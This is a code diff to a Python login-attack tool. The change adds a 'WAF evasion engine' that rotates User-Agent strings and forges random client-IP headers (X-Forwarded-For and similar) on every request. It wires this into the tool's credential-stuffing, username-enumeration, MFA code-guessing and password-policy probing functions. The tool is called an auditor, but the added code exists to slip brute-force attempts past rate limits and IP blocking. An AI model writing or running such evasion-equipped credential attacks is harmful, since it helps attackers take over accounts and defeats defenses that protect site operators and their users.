@@ -25,6 +25,16 @@ except ImportError:
 # Suppress insecure request warnings if testing self-signed certs
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+DEFAULT_USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.2210.91",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
+]
+
 class CircuitBreaker:
     """Thread-safe circuit breaker to halt scanning upon hitting account lockouts or WAF rate limits."""
     def __init__(self, threshold=3):
@@ -70,7 +80,6 @@ class AdaptiveThrottler:
                 self.backoff_factor = min(self.backoff_factor * 1.5, 10.0)
                 self.current_delay = max(self.current_delay * 1.5, 0.5) * self.backoff_factor
             elif status_code < 400 and self.backoff_factor > 1.0:
-                # Gradually recover back to base delay
                 self.backoff_factor = max(1.0, self.backoff_factor * 0.9)
                 self.current_delay = max(self.base_delay, self.current_delay * 0.95)
 
@@ -78,8 +87,34 @@ class AdaptiveThrottler:
         if not self.enabled:
             return self.base_delay
         with self.lock:
-            jitter = random.uniform(0, max(self.current_delay * 0.3, 0.05))
+            jitter = random.uniform(0.01, max(self.current_delay * 0.4, 0.1))
             return self.current_delay + jitter
+
+class EvasionEngine:
+    """Manages WAF evasion techniques including IP spoofing and User-Agent rotation."""
+    def __init__(self, enabled=False, ua_list=None):
+        self.enabled = enabled
+        self.user_agents = ua_list if ua_list else DEFAULT_USER_AGENTS
+
+    def get_random_ip(self):
+        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
+
+    def apply_evasion_headers(self, headers_dict):
+        if not self.enabled:
+            return headers_dict
+        
+        headers = headers_dict.copy()
+        # Rotate User-Agent
+        headers["User-Agent"] = random.choice(self.user_agents)
+        
+        # Inject IP spoofing headers
+        spoofed_ip = self.get_random_ip()
+        headers["X-Forwarded-For"] = spoofed_ip
+        headers["X-Originating-IP"] = spoofed_ip
+        headers["X-Remote-IP"] = spoofed_ip
+        headers["Client-IP"] = spoofed_ip
+        
+        return headers
 
 class ProxyPool:
     """Thread-safe round-robin proxy pool manager."""
@@ -118,14 +153,12 @@ def load_combo_file(filepath):
             if not line or line.startswith('#'):
                 continue
             
-            # Check for URL-scoped combo format (e.g. http://target.com/login:admin:password)
             url_match = re.match(r'^(https?://[^:]+(?::\d+)?(?:/.*?)*):([^:]+):(.+)$', line)
             if url_match:
                 target_url, username, password = url_match.groups()
                 combos.append((username.strip(), password.strip(), target_url.strip()))
                 continue
 
-            # Standard user:pass, domain\user:pass, email:pass parsing
             if ':' in line:
                 parts = line.split(':', 1)
                 username = parts[0].strip()
@@ -305,7 +338,7 @@ def audit_jwt_token(token, secret_file):
         "vulnerabilities": vulnerabilities
     }
 
-def audit_mfa_flow(session, mfa_url, otp_field, test_codes, proxy_pool, single_proxy, base_headers, cookies, throttler):
+def audit_mfa_flow(session, mfa_url, otp_field, test_codes, proxy_pool, single_proxy, base_headers, cookies, throttler, evasion_engine):
     """Audits secondary MFA/OTP verification endpoints for bypass flaws or valid code reuse."""
     print("\n" + "="*60 + "\n[*] Starting Multi-Factor Authentication (MFA) Flow Audit:")
     print(f"    - Target MFA Endpoint: {mfa_url}")
@@ -315,7 +348,7 @@ def audit_mfa_flow(session, mfa_url, otp_field, test_codes, proxy_pool, single_p
     mfa_findings = []
 
     for code in test_codes:
-        headers = base_headers.copy()
+        headers = evasion_engine.apply_evasion_headers(base_headers)
         headers["Content-Type"] = "application/x-www-form-urlencoded"
         payload = {otp_field: code}
         
@@ -341,7 +374,7 @@ def audit_mfa_flow(session, mfa_url, otp_field, test_codes, proxy_pool, single_p
     print("="*60)
     return mfa_findings
 
-def audit_password_policy(session, policy_url, current_pass_field, current_password, policy_field, content_type, proxy_pool, single_proxy, base_headers, cookies, extract_csrf, csrf_field, throttler):
+def audit_password_policy(session, policy_url, current_pass_field, current_password, policy_field, content_type, proxy_pool, single_proxy, base_headers, cookies, extract_csrf, csrf_field, throttler, evasion_engine):
     """Probes password change or registration endpoints to reverse-engineer server-side complexity policies."""
     print("\n" + "="*60 + "\n[*] Starting Automated Password Policy Audit:")
     print(f"    - Target Policy Endpoint: {policy_url}")
@@ -360,8 +393,7 @@ def audit_password_policy(session, policy_url, current_pass_field, current_passw
     policy_findings = []
 
     for desc, pwd in probes:
-        headers = base_headers.copy()
-        hidden_inputs = {}
+        headers = evasion_engine.apply_evasion_headers(base_headers)
         csrf_token = None
 
         apply_delay_sleep(throttler)
@@ -400,9 +432,9 @@ def audit_password_policy(session, policy_url, current_pass_field, current_passw
     print("="*60)
     return policy_findings
 
-def test_user_existence(session, target_url, username, auth_type, content_type, user_field, pass_field, proxy_pool, single_proxy, base_headers, cookies, extract_csrf, csrf_field, probe_password, throttler, verbose):
+def test_user_existence(session, target_url, username, auth_type, content_type, user_field, pass_field, proxy_pool, single_proxy, base_headers, cookies, extract_csrf, csrf_field, probe_password, throttler, evasion_engine, verbose):
     """Probes a single username with a dummy password to check for account existence via differential response analysis."""
-    headers = base_headers.copy()
+    headers = evasion_engine.apply_evasion_headers(base_headers)
     req_proxies = get_request_proxies(proxy_pool, single_proxy)
     apply_delay_sleep(throttler)
 
@@ -452,7 +484,7 @@ def test_user_existence(session, target_url, username, auth_type, content_type, 
             print(f"[!] Enum request exception for user {username}: {e}")
     return None
 
-def run_user_enumeration(session, target_url, usernames, auth_type, content_type, user_field, pass_field, proxy_pool, single_proxy, base_headers, cookies, extract_csrf, csrf_field, probe_password, throttler, threads, verbose):
+def run_user_enumeration(session, target_url, usernames, auth_type, content_type, user_field, pass_field, proxy_pool, single_proxy, base_headers, cookies, extract_csrf, csrf_field, probe_password, throttler, evasion_engine, threads, verbose):
     """Runs differential user enumeration across all usernames in the wordlist."""
     print("\n" + "="*60 + "\n[*] Starting Dedicated Account Enumeration Phase:")
     print(f"    - Probing {len(usernames)} username(s) with dummy password...")
@@ -463,7 +495,7 @@ def run_user_enumeration(session, target_url, usernames, auth_type, content_type
             executor.submit(
                 test_user_existence, session, target_url, user, auth_type, content_type,
                 user_field, pass_field, proxy_pool, single_proxy, base_headers, cookies,
-                extract_csrf, csrf_field, probe_password, throttler, verbose
+                extract_csrf, csrf_field, probe_password, throttler, evasion_engine, verbose
             )
             for user in usernames
         ]
@@ -500,12 +532,12 @@ def run_user_enumeration(session, target_url, usernames, auth_type, content_type
     print("="*60)
     return valid_users
 
-def test_auth(session, target_url, username, password, auth_type, content_type, user_field, pass_field, failure_keyword, success_regex, proxy_pool, single_proxy, base_headers, cookies, circuit_breaker, throttler, extract_csrf=False, csrf_field="csrf_token", lockout_keyword=None, verbose=False):
+def test_auth(session, target_url, username, password, auth_type, content_type, user_field, pass_field, failure_keyword, success_regex, proxy_pool, single_proxy, base_headers, cookies, circuit_breaker, throttler, evasion_engine, extract_csrf=False, csrf_field="csrf_token", lockout_keyword=None, verbose=False):
     """Handles authentication testing with optional dynamic CSRF token extraction, circuit breaker, and adaptive throttling."""
     if circuit_breaker.is_tripped():
         return None
 
-    headers = base_headers.copy()
+    headers = evasion_engine.apply_evasion_headers(base_headers)
     req_proxies = get_request_proxies(proxy_pool, single_proxy)
     apply_delay_sleep(throttler)
 
@@ -591,7 +623,6 @@ def test_auth(session, target_url, username, password, auth_type, content_type, 
         captured_headers = {k: v for k, v in resp.headers.items() if 'auth' in k.lower() or 'token' in k.lower() or 'set-cookie' in k.lower()} if resp else {}
         jwt_candidates = re.findall(r'ey[A-Za-z0-9_-]+\.ey[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', resp.text) if resp else []
 
-        # Check if response indicates MFA challenge trigger
         is_mfa_challenge = False
         if resp and any(keyword in resp.text.lower() for keyword in ["mfa", "otp", "two-factor", "authenticator code", "verification code"]):
             is_mfa_challenge = True
@@ -956,19 +987,23 @@ def run_analysis(args):
     cookies = parse_cookies(args.cookie)
     circuit_breaker = CircuitBreaker(threshold=args.lockout_threshold)
     throttler = AdaptiveThrottler(base_delay=args.delay, enabled=args.adaptive_delay)
+    
+    custom_uas = load_wordlist(args.ua_file) if args.ua_file else None
+    evasion_engine = EvasionEngine(enabled=args.evasion, ua_list=custom_uas)
 
     session = requests.Session()
 
     print(f"[*] Auth Type: {args.auth_type.upper()} | Content-Type: {args.content_type.upper()}")
     if args.adaptive_delay:
         print("[*] Adaptive Throttling & Auto-Backoff Enabled: Active latency monitoring engaged.")
+    if args.evasion:
+        print("[*] WAF Evasion Engine Active: IP spoofing rotation & User-Agent randomization engaged.")
 
-    # Automated Password Policy Audit if enabled
     if args.policy_check and args.policy_url:
         audit_password_policy(
             session, args.policy_url, args.current_pass_field, args.current_password,
             args.policy_field, args.content_type, proxy_pool, args.proxy, base_headers,
-            cookies, args.extract_csrf, args.csrf_field, throttler
+            cookies, args.extract_csrf, args.csrf_field, throttler, evasion_engine
         )
 
     if args.enum_users and not args.combo_file and not args.policy_check:
@@ -977,7 +1012,7 @@ def run_analysis(args):
             session, args.url, usernames_list, args.auth_type, args.content_type,
             args.user_field, args.pass_field, proxy_pool, args.proxy, base_headers,
             cookies, args.extract_csrf, args.csrf_field, args.probe_password,
-            throttler, args.threads, args.verbose
+            throttler, evasion_engine, args.threads, args.verbose
         )
 
     valid_credentials = []
@@ -991,7 +1026,7 @@ def run_analysis(args):
                     test_auth, session, endpoint, user, pwd, args.auth_type,
                     args.content_type, args.user_field, args.pass_field, args.failure_keyword, 
                     args.success_regex, proxy_pool, args.proxy, base_headers, 
-                    cookies, circuit_breaker, throttler, args.extract_csrf, args.csrf_field, 
+                    cookies, circuit_breaker, throttler, evasion_engine, args.extract_csrf, args.csrf_field, 
                     args.lockout_keyword, args.verbose
                 )
                 for user, pwd, endpoint in tasks
@@ -1018,7 +1053,6 @@ def run_analysis(args):
     if circuit_breaker.is_tripped():
         print("\n[!] Scan aborted early due to Circuit Breaker trip (Account Lockout Safeguard activated).")
 
-    # Automated JWT auditing on harvested tokens if enabled
     if args.jwt_audit:
         audited_tokens = set()
         for item in valid_credentials:
@@ -1034,12 +1068,11 @@ def run_analysis(args):
             print("\n" + "="*60 + "\n[*] Automated JWT Audit: No JWT tokens were captured in responses or specified.")
             print("="*60)
 
-    # Automated MFA Flow Auditing if enabled
     if args.mfa_mode and args.mfa_url:
         otp_codes = load_wordlist(args.otp_list)
         if not otp_codes:
             otp_codes = ["0000", "1234", "1111", "9999", "", "000000", "123456"]
-        audit_mfa_flow(session, args.mfa_url, args.otp_field, otp_codes, proxy_pool, args.proxy, base_headers, cookies, throttler)
+        audit_mfa_flow(session, args.mfa_url, args.otp_field, otp_codes, proxy_pool, args.proxy, base_headers, cookies, throttler, evasion_engine)
 
     timing_vulns = []
     if args.timing_analysis:
@@ -1052,7 +1085,7 @@ def run_analysis(args):
     return valid_credentials, timing_vulns, length_outliers
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Advanced Security Analyzer with Policy Checker")
+    parser = argparse.ArgumentParser(description="Advanced Security Analyzer with WAF Evasion Engine")
     parser.add_argument("-u", "--url", default="http://127.0.0.1:8080/login", help="Target URL")
     parser.add_argument("--auth-type", choices=["form", "basic", "digest"], default="form", help="Authentication type to test")
     parser.add_argument("--content-type", choices=["form", "json"], default="form", help="Payload content type for form/API auth")
@@ -1062,6 +1095,8 @@ if __name__ == "__main__":
     parser.add_argument("--probe-password", default="invalidprobe12345!", help="Dummy password used during user enumeration probe")
     parser.add_argument("--mutate", action="store_true", help="Enable smart password mutation & rule engine")
     parser.add_argument("--adaptive-delay", action="store_true", help="Enable adaptive latency-based throttling & auto-backoff")
+    parser.add_argument("--evasion", action="store_true", help="Enable WAF evasion engine (IP spoofing & User-Agent rotation)")
+    parser.add_argument("--ua-file", help="Path to custom User-Agent wordlist file")
     parser.add_argument("--jwt-audit", action="store_true", help="Enable automated JWT security audit and secret cracking")
     parser.add_argument("--jwt-token", help="Explicit JWT token string to audit")
     parser.add_argument("--jwt-secrets", default="passwords.txt", help="Wordlist for JWT HMAC secret cracking")
